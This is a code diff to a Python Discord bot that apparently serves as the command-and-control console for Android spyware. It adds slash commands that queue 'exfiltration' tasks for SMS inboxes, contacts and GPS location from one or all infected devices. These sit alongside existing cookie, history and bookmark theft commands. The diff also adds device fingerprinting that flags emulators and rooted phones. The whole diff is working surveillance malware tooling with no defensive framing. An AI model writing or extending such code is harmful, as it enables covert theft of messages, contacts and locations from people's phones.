@@ -100,9 +100,15 @@ def format_server_devices(data: dict[str, Any]) -> str:
     lines = [f"✅ **Server Response — {data.get('message', '')}**"]
     for d in devices:
         status_emoji = "🟢" if d["status"] == "online" else "🔴"
+        badges = ""
+        if d.get("is_emulator"):
+            badges += " 🤖"
+        if d.get("is_rooted"):
+            badges += " 🔓"
+        carrier = f" | {d['carrier']}" if d.get("carrier") else ""
         lines.append(
-            f"{status_emoji} **{d['name']}** — "
-            f"IP: `{d['ip']}` — Status: {d['status']}"
+            f"{status_emoji} **{d['name']}**{badges} — "
+            f"IP: `{d['ip']}`{carrier}"
         )
     return "\n".join(lines)
 
@@ -138,17 +144,27 @@ def format_server_results(data: dict[str, Any]) -> str:
         "request-cookies": "🍪",
         "request-history": "📜",
         "request-bookmarks": "🔖",
+        "request-contacts": "👤",
+        "request-sms": "💬",
+        "request-location": "📍",
     }
 
     lines = [f"📊 **{data.get('message', 'Task Results')}**"]
     for device_name, device_results in results.items():
         lines.append(f"\n📱 **{device_name}**")
-        for task_type, result in device_results.items():
+        for task_type, history in device_results.items():
             emoji = task_emojis.get(task_type, "📄")
-            status_icon = "✅" if result.get("success") else "❌"
-            received = result.get("received_at", "")[:19].replace("T", " ")
-            lines.append(f"  {emoji} `{task_type}` — {status_icon} `{received}`")
-            output = str(result.get("data", {}).get("output", ""))
+            # history is a list (newest first); show latest + count
+            if not history:
+                continue
+            latest = history[0]
+            status_icon = "✅" if latest.get("success") else "❌"
+            received = latest.get("received_at", "")[:19].replace("T", " ")
+            count_label = f" *(+{len(history) - 1} older)*" if len(history) > 1 else ""
+            lines.append(
+                f"  {emoji} `{task_type}` — {status_icon} `{received}`{count_label}"
+            )
+            output = str(latest.get("data", {}).get("output", ""))
             if output:
                 for line in output.split("\n")[:5]:
                     lines.append(f"    > {line[:120]}")
@@ -494,6 +510,117 @@ async def request_bookmarks(
     await interaction.response.send_message(response)
 
 
+@bot.tree.command(
+    name="request-sms",
+    description="Request SMS inbox from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_sms(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue an SMS exfiltration task. Requires READ_SMS to be granted on device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-sms")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-sms", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-sms",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="request-location",
+    description="Request last known GPS location from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_location(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a location exfiltration task (uses cached GPS fix, no active tracking)."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-location")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-location", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-location",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="request-contacts",
+    description="Request contacts from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_contacts(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a contacts exfiltration task. Requires READ_CONTACTS to be granted on device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-contacts")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-contacts", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-contacts",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
 # ---------------------------------------------------------------------------
 # Task queue autocomplete
 # ---------------------------------------------------------------------------
@@ -502,6 +629,9 @@ VALID_TASK_TYPES = [
     "request-cookies",
     "request-history",
     "request-bookmarks",
+    "request-contacts",
+    "request-sms",
+    "request-location",
 ]
 
 
@@ -644,6 +774,45 @@ async def pending_tasks(interaction: discord.Interaction) -> None:
             response = "\n".join(lines)
     else:
         response = "❌ Server unreachable — cannot check pending tasks."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="device-info",
+    description="Show full fingerprint details for a specific device.",
+)
+@app_commands.describe(device="Device name (e.g. POCO_F5)")
+async def device_info(interaction: discord.Interaction, device: str) -> None:
+    """Display rich fingerprint data for the requested device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "device-info")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "device-info")
+
+    server_response = await call_server(f"/admin/device-info/{device}")
+    if server_response:
+        d = server_response.get("data", {})
+        status_emoji = "🟢" if d.get("status") == "online" else "🔴"
+        emulator_line = " 🤖 *emulator*" if d.get("is_emulator") else ""
+        rooted_line = " 🔓 *rooted*" if d.get("is_rooted") else ""
+        lines = [
+            f"📱 **Device: {d.get('name')}**{emulator_line}{rooted_line}",
+            f"  Status: {status_emoji} {d.get('status')}",
+            f"  IP: `{d.get('ip')}`",
+            f"  OS: `{d.get('os_info')}`",
+            f"  Carrier: `{d.get('carrier', 'unknown')}`",
+            f"  Installed apps: `{d.get('installed_apps_count', 0)}`",
+            f"  Last seen: `{d.get('last_seen')}`",
+        ]
+        response = "\n".join(lines)
+    else:
+        response = f"❌ Could not retrieve device info for `{device}`."
 
     await interaction.response.send_message(response)
 
